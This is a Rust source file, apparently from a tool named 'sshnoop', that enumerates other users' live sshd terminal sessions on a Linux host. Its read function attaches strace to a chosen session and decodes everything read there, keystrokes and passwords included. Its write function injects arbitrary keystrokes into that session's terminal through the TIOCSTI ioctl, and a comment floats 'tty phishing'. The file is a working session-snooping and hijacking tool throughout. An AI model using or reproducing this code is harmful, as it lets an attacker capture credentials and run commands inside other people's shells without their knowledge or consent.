use getch_rs::{Getch, Key};
use hex;
use nix::libc::{ioctl, TIOCSTI};
use procfs::process::{self, Process};
use regex::Regex;
use std::collections::HashMap;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::os::fd::AsRawFd;
use std::process::{ChildStderr, Command, Stdio};
use std::str::FromStr;

pub fn read(pid: &str) {
    println!("Attaching reader to {pid}");

    let mut child = Command::new("strace")
        .args(["-xx", "-s", "16384", "-p", &pid, "-e", "read"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to start strace command");

    println!("{}", tty_of_sshd(pid).expect("Failed to open tty"));

    let file = std::fs::OpenOptions::new()
        .read(true)
        .open(tty_of_sshd(pid).unwrap())
        .expect("Failed to open tty"); // TODO: Don't panic when connection closes.

    let fd = file.as_raw_fd();

    let stderr = child.stderr.take().expect("Failed to capture stderr");

    let mut reader = BufReader::new(stderr);

    // TODO: Need to figure out which exact file descriptor is being used

    println!("{fd:?}");

    let re = Regex::new(&format!(r#"(?mU)read\({}, "(.*)""#, fd.to_string())).unwrap();

    loop {
        let mut buf = String::new();
        let _ = reader.read_line(&mut buf);
        buf = buf.replace("\\x", "");

        if let Some(caps) = re.captures(&buf) {
            if let Some(mat) = caps.get(1) {
                let decoded_hex = hex::decode(mat.as_str()).expect("Failed to decode");
                io::stdout().write_all(&decoded_hex).expect("Pipe died");
                io::stdout().flush().unwrap();
            }
        }

        if let Ok(Some(_status)) = child.try_wait() {
            println!("Connection closed");
            break;
        }
    }
}

fn find_fd(pid: &str, reader: BufReader<ChildStderr>) {
    let re = Regex::new(r#"(?mU)read\(([0-9]+), "(.*)""#).unwrap();

    write_str(
        &tty_of_sshd(pid).expect("Failed to get tty"),
        " \x08\x1b\x5b\x4b",
    );

    let map = HashMap::<u32, Vec<&str>>::new();

    loop {
        // Loop till we find the string we write to their console
        // Read every read syscall, add the chars to a map of Map<fd,Vec<char>>
        // At the end of each loop check each vec to see if our special chars are there
    }
}

/// Given the pid of an sshd process, return the tty
/// This only works for sshd because they expose the tty in the cmdline
pub fn tty_of_sshd(pid: &str) -> Result<String, std::io::Error> {
    let cmdline = std::fs::read_to_string(format!("/proc/{pid}/cmdline"))?;

    // format: /path/to/sshd: user@tty
    let parts: Vec<&str> = cmdline.split('@').collect();

    if parts.len() != 2 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid cmdline",
        ));
    }

    // prepend /dev/ to tty, trim '\0' and return
    Ok(format!("/dev/{}", parts[1].trim_end_matches('\0')))
}

pub fn get_pts_user(pid: &str) -> Result<String, std::io::Error> {
    let cmdline = std::fs::read_to_string(format!("/proc/{pid}/cmdline"))?;

    // format: /path/to/sshd: user@tty
    let parts: Vec<&str> = cmdline.split('@').collect();

    if parts.len() != 2 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid cmdline",
        ));
    }
    Ok(String::from_str(parts[0].split(": ").nth(1).expect("Unreachable")).unwrap())
}

/// Takes a PID and writes to the stdin of the process
pub fn write(pid: &str) {
    let tty = &tty_of_sshd(pid).expect("Failed to get TTY");
    println!("Attaching writer to {}", tty);

    let input = Getch::new();

    loop {
        match input.getch() {
            Ok(Key::Ctrl('p')) => continue, // TODO: tty phishing?
            Ok(Key::Ctrl('z')) => break,
            Ok(Key::Ctrl('d')) => break,
            Ok(Key::Delete) => {
                // This is actually backspace but the crate we are using is cooked
                write_str(tty, "\x08\x1b\x5b\x4b");
            }
            Ok(Key::Ctrl('c')) => write_str(tty, "\x03"),
            Ok(Key::Char(c)) => {
                write_str(tty, &c.to_string());
            }
            _ => {}
        }
    }
}

fn write_char(tty: &str, c: u8) {
    let file = std::fs::OpenOptions::new()
        .write(true)
        .open(tty)
        .expect("Failed to open tty"); // TODO: Don't panic when connection closes.

    let fd = file.as_raw_fd();

    unsafe {
        ioctl(fd, TIOCSTI, &c as *const _ as *const i8);
    }
}

fn write_str(tty: &str, s: &str) {
    s.bytes().into_iter().for_each(|c| write_char(tty, c))
}

pub fn get_options() -> Vec<Process> {
    let all_processes: Vec<Process> = process::all_processes()
        .expect("Can't read /proc")
        .filter_map(|p| match p {
            Ok(p) => Some(p), // happy path
            Err(e) => match e {
                procfs::ProcError::NotFound(_) => None, // process vanished during iteration, ignore it
                procfs::ProcError::Io(_, _) => None, // can match on path to decide if we can continue
                x => {
                    println!("Can't read process due to error {x:?}"); // some unknown error
                    None
                }
            },
        })
        .collect();

    let re = Regex::new(r#"^sshd: (.+)@(pts/[0-9])"#).unwrap();

    let mut pts_processes: Vec<Process> = Vec::new();

    for proc in all_processes {
        if let Ok(cmd) = proc.cmdline() {
            if cmd.len() == 1 && re.is_match(&cmd[0]) {
                // Find all sshd pts processes
                let pid = proc.stat().unwrap().pid;

                match Process::new(pid) {
                    Ok(p) => pts_processes.push(p),
                    Err(_) => (),
                };
            }
        }
    }

    // Don't want to bother with out own tty, so we will find and remove it
    // Need to recurse up tree to find a process in our list.
    if let Some(sshd_pid) = find_sshd_parent(Process::myself().unwrap().stat().unwrap().pid) {
        pts_processes.retain(|p| p.pid != sshd_pid);
    }
    pts_processes
}

/// Returns id of the process that is the sshd pts parent of the sshnoop process\
// Or returns None if sshnoop isn't a child of sshd.
fn find_sshd_parent(pid: i32) -> Option<i32> {
    if let Ok(process) = Process::new(pid) {
        let comm = process.stat().unwrap().comm;

        if comm == "sshd" {
            return Some(pid);
        }

        if let Ok(stat) = process.stat() {
            return find_sshd_parent(stat.ppid);
        }
    }
    None
}
